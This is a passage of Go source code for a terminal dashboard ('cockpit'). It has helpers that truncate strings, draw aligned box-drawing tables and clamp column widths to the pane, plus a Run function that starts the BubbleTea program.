	if n <= 0 {
		return ""
	}
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	if n == 1 {
		return string(r[:1])
	}
	return string(r[:n-1]) + "…"
}

// asciiTable renders an aligned box-drawing table.
func asciiTable(headers []string, rows [][]string, widths []int) string {
	sep := func(cornerL, mid, cornerR, fill string) string {
		parts := []string{cornerL}
		for i, w := range widths {
			parts = append(parts, strings.Repeat(fill, w+2))
			if i < len(widths)-1 {
				parts = append(parts, mid)
			} else {
				parts = append(parts, cornerR)
			}
		}
		return strings.Join(parts, "")
	}
	cell := func(s string, w int) string {
		s = truncate(s, w)
		pad := w - lipgloss.Width(s)
		if pad < 0 {
			pad = 0
		}
		return " " + s + strings.Repeat(" ", pad) + " "
	}
	var b strings.Builder
	b.WriteString(sep("┌", "┬", "┐", "─") + "\n")
	b.WriteString("│")
	for i, h := range headers {
		b.WriteString(cell(h, widths[i]))
		if i < len(headers)-1 {
			b.WriteString("│")
		}
	}
	b.WriteString("│\n")
	b.WriteString(sep("├", "┼", "┤", "─") + "\n")
	for _, r := range rows {
		b.WriteString("│")
		for i, c := range r {
			b.WriteString(cell(c, widths[i]))
			if i < len(r)-1 {
				b.WriteString("│")
			}
		}
		b.WriteString("│\n")
	}
	b.WriteString(sep("└", "┴", "┘", "─") + "\n")
	return b.String()
}

// clampTableWidths shrinks column widths so the box table fits the available
// pane width. It preserves column order and only trims toward a 3-rune floor,
// so a narrow shell pane never receives an over-wide line that would corrupt
// the BubbleTea layout.
func clampTableWidths(widths []int, avail int) []int {
	total := func(ws []int) int {
		t := 0
		for _, w := range ws {
			t += w + 2
		}
		return t + len(ws) - 1
	}
	if avail <= 0 || total(widths) <= avail {
		return widths
	}
	const minW = 3
	out := make([]int, len(widths))
	for i := range out {
		out[i] = minW
	}
	left := avail - total(out)
	if left < 0 {
		return out
	}
	rem := append([]int{}, widths...)
	for left > 0 {
		changed := false
		for i := range out {
			if rem[i] > minW {
				out[i]++
				rem[i]--
				left--
				changed = true
				if left <= 0 {
					break
				}
			}
		}
		if !changed {
			break
		}
	}
	return out
}

// Run starts the cockpit. It uses the alternate screen buffer so the host
// terminal is restored on exit; BubbleTea manages SIGWINCH internally.
func Run(cfg Config) error {
	// Keep log entries in the telemetry pane only; without this they also print
	// raw to the terminal beneath the UI and look like a duplicated feed.
	log.SetQuiet(true)
	p := tea.NewProgram(NewModel(cfg), tea.WithAltScreen())
	_, err := p.Run()
	return err
}
